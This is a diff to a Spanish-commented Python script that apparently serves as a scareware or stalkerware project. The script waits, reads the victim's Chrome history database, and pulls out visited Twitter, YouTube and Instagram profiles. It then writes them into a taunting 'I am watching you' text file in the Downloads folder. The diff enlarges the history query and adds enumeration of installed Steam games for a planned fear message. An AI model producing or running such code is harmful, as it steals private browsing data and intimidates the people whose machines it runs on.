@@ -1,11 +1,11 @@
 import os
 import re
+import time
 from pathlib import Path
 from time import sleep
 from random import randrange
 import sqlite3
-
-
+from contextlib import closing
 #CONSTANT
 
 HACKER_FILE = "XXDX--000.txt"
@@ -19,8 +19,8 @@ def delay_action():
 
 
 def get_user_path():
-
     return "{}/".format(Path.home())
+
 
 def generate_txt_message(user_path):
     # Crear archivo
@@ -36,9 +36,10 @@ def generate_txt_message(user_path):
     hacker_file = open(user_path + "Downloads/" + HACKER_FILE, "w")
     hacker_file.writelines("SOY UN DESGRACIADO PERO TE TENGO VIGILADO\n")
     return hacker_file
-def get_chrome_history(user_path):
 
-#HACER QUE SE EJECUTE HASTA QUE EL GOOGLE SE CIERRE
+
+def get_chrome_history(user_path):
+    #HACER QUE SE EJECUTE HASTA QUE EL GOOGLE SE CIERRE
     ursl = None
 
     while not ursl:
@@ -53,7 +54,7 @@ def get_chrome_history(user_path):
             cursor = connection.cursor()
 
             # REALIZAR SENTENCIA SQL para ver los datos que nos gustaría
-            cursor.execute("SELECT title, last_visit_time,url from urls ORDER BY  last_visit_time DESC LIMIT 50")
+            cursor.execute("SELECT title, last_visit_time,url from urls ORDER BY  last_visit_time DESC LIMIT 200")
 
             # Recoge todos los datos
             urls = cursor.fetchall()
@@ -61,6 +62,7 @@ def get_chrome_history(user_path):
             # MOSTRARMOS POR CONSOLA LA RESPUESTA A LA BD
             print(urls)
 
+            cursor.close()
             # Cerrar conexion
             connection.close()
 
@@ -72,7 +74,6 @@ def get_chrome_history(user_path):
 
 
 def check_history_write(hacker_file, chrome_history):
-
     for item in chrome_history[:10]:
         hacker_file.write("He visto que has visitado la web : {} , interesante \n".format(item[0]))
 
@@ -85,7 +86,8 @@ def check_profile_of_twitter(hacker_file, chrome_history):
         if results and results[0] not in ["notifications", "home", "messages", "explore"]:
             user_profile.append(results[0])
 
-    hacker_file.write("E VISTO QUE HAS ENTRADO EN LOS PERFILES DE : {}".format(", ".join(user_profile)))
+    hacker_file.write("E VISTO QUE HAS ENTRADO EN LOS PERFILES DE TWITTER DE : {}".format(", ".join(user_profile))+"\n")
+
 
 def check_channel_of_youtube(hacker_file, chrome_history):
     #ARRAY DONDE SE GUARDARÁ EL CANAL DE YOUTUBE
@@ -94,7 +96,7 @@ def check_channel_of_youtube(hacker_file, chrome_history):
         results = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
         if results and results[0]:
             channels.append(results[0])
-    hacker_file.write("\nHAS VISITADO LOS CANALES DE  YOUTUBE ... : {}".format(", ".join(channels)))
+    hacker_file.write("\nHAS VISITADO LOS CANALES DE  YOUTUBE ... : {}".format(", ".join(channels))+"\n")
 
 
 def check_profile_instagram(hacker_file, chrome_history):
@@ -112,10 +114,31 @@ def check_profile_instagram(hacker_file, chrome_history):
                 for result in results:
                     if result not in user_insta:
                         user_insta.append(result)
-    hacker_file.write("\nSe que has entrado en instagram y has visto unos perfiles como....:{}".format(", ".join(user_insta)))
+    hacker_file.write(
+        "\nSe que has entrado en instagram y has visto unos perfiles como....:{}".format(", ".join(user_insta))+"\n")
+
+
+def check_games_of_steam(hacker_file):
+    try:
+        steam_path = "C:/Program Files (x86)/Steam/steamapps/common"
+        list_of_games = []
+
+        games = os.listdir(steam_path)
+        for games in games:
+            if games not in ["Steam Controller Configs", "Steamworks Shared"]:
+                list_of_games.append(games)
+
+        hacker_file.write("\nSE QUE HAS JUGADO A ESTOS JUEGOS DE STEAM: \n" + "\n".join(list_of_games))
+        # print("HORA DE JUEGO: {}".format(time.ctime(os.path.getmtime(steam_path))))
+        print("Juegos guardados:",list_of_games)
+
+    except FileNotFoundError:
+        print("No se encontró la ruta")
+
+    #MENSAJE DE MIEDO QUE JUEA A JUEGOS Y ORDENADO POR FECHAS
+
 
 def main():
-
     #1 Esperamos que pase el tiempo establecido
     delay_action()
 
@@ -126,6 +149,7 @@ def main():
 
     #CREAMOS EL ARCHIVO
     hacker_file = generate_txt_message(user_path)
+
 
     #RECOGEMOS EL HISTORIAL DEL USUARIO DE GOOGLE
     chrome_history = get_chrome_history(user_path)
@@ -138,17 +162,17 @@ def main():
     #EXTRAER Y LEER LOS PERFILES DE INSTA Y AGREGARLOS A UN TXT
     check_profile_instagram(hacker_file, chrome_history)
 
+    # Obtener los juegos que tiene en steam
+    check_games_of_steam(hacker_file)
     #VER HISTORIAL
     # get_chrome_history(user_path)
 
     #Obtener nombre del user
     # print(os.getlogin())
 
+
 if __name__ == '__main__':
     main()
 
-
 #ANOTACIONES
-        #NO SE PUEDE EJECUTAR SI EL GOOGLE CHROME ESTA ABIERTO NECESITA ESTAR CERRADO
-
-
+#NO SE PUEDE EJECUTAR SI EL GOOGLE CHROME ESTA ABIERTO NECESITA ESTAR CERRADO
